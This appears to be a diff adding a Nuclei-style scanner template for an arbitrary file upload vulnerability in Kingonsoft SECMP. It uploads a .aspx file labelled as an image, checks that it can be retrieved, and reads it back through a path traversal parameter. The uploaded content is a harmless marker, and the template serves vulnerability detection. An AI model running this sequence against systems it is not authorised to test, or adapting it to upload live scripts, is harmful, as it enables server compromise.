@@ -1,0 +1,65 @@
+id: kingonsoft-secmp-uploader-file-upload
+info:
+  name: Kingonsoft SECMP Arbitrary File Upload Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-upload
+
+variables:
+  t1: '{{rand_text_alphanumeric(5)}}'
+  t2: '{{base64(t1)}}'
+  dt3: '{{date_time("2006")}}{{date_time("01")}}'
+  dt4: '{{date_time("02")}}'
+
+flow: |
+  http(1) && http(2) && http(3)
+
+http:
+  - id: upload-file
+    method: POST
+    path:
+      - "{{BaseURL}}/DevApi/Uploader"
+    headers:
+      Content-Type: multipart/form-data; boundary=---------------------------45250802924973458471174811279
+    body: |
+      -----------------------------45250802924973458471174811279
+      Content-Disposition: form-data; name="file"; filename="{{t1}}.aspx"
+      Content-Type: image/png
+
+      {{t2}}
+      -----------------------------45250802924973458471174811279
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - '"url":'
+          - '.aspx'
+
+  - id: verify-upload
+    method: GET
+    path:
+      - "{{BaseURL}}/Content/Upload/{{dt3}}/{{dt4}}/{{t1}}.aspx"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{t2}}"
+
+  - id: verify-download
+    method: GET
+    path:
+      - "{{BaseURL}}/DevApi/DownFile?FileName=../Content/Upload/{{dt3}}/{{dt4}}/{{t1}}.aspx"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{t2}}"
